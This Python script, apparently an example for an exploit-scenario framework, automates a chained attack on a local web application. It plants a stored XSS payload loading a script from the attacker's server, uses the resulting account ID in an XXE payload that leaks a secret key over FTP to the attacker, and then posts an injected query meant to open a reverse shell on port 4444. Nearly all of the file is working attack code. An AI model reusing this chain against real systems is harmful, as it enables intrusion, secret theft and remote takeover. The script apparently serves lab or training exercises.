#!/usr/bin/env python3

import os

import requests

from horrors import (
    scenarios,
    services,
    triggers,
)


async def plant_xss(scenario):
    """Post XSS payload

    """
    await scenario.background(
        requests.post,
        'http://{rhost}:{rport}/test/'.format(**scenario.context),
        data='field=<script src=http://{lhost}:{lport_http}/xss.js></script>'.format(**scenario.context),
        headers=scenario.context['post_headers'],
        proxies=scenario.context['proxy']
    )


async def get_new_account(scenario):
    """Wait for `xss` event triggered when request path contains `xss.js`

    """
    result = await scenario.background(
        requests.get,
        'http://{rhost}:{rport}/userid/{username}'.format(**scenario.context),
        proxies=scenario.context['proxy']
    )
    scenario.context['userid'] = result.text


async def send_xxe(scenario):
    """Post XXE payload using value `userid` stored in local context

    """
    await scenario.background(
        requests.post,
        'http://{rhost}:{rport}/xml-import/'.format(**scenario.context),
        data='<?xml version="1.0" ?><something evil="{userid}">ftp://{lhost}:{lport_ftp}</something>'.format(**scenario.context),
        headers=scenario.context['post_headers'],
        proxies=scenario.context['proxy']
    )


async def reverse_shell(scenario):
    """Wait for `xxe` event triggered when remote client connects via FTP and sends the secret

    """
    await scenario.background(
        requests.post,
        'http://{rhost}:{rport}/query/'.format(**scenario.context),
        data='secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
        headers=scenario.context['post_headers'],
        proxies=scenario.context['proxy']
    )


async def done(scenario):
    print('Done! 8-]')


if __name__ == "__main__":
    context = {
        'rhost': '127.0.0.1',
        'rport': 8008,
        'lhost': '127.0.0.1',
        'lport_http': 8888,
        'lport_reverse': 4444,
        'lport_ftp': 2121,
        'username': 'evil',
        'proxy': {'http': 'http://127.0.0.1:8080'},
        'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
    }

    httpd = services.HTTPStatic({
        '/': 'This is home page...',
        '/xss.js': open(os.path.join(os.path.dirname(__file__), 'xss.js.template')).read().format(**context),
        '/timestamp': services.HTTPStatic.timestamp,
    })
    httpd.set_state('xss', when=triggers.PathContains('xss.js'))

    ftpd = services.FTPReader()
    ftpd.set_state('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))

    story = scenarios.Scenario(**context)
    story.debug()
    story.spawn(httpd)
    story.spawn(ftpd)
    story.add(plant_xss)
    story.add(get_new_account, when='xss')
    story.add(send_xxe)
    story.add(reverse_shell, when='xxe')
    story.add(done)
    story.play()
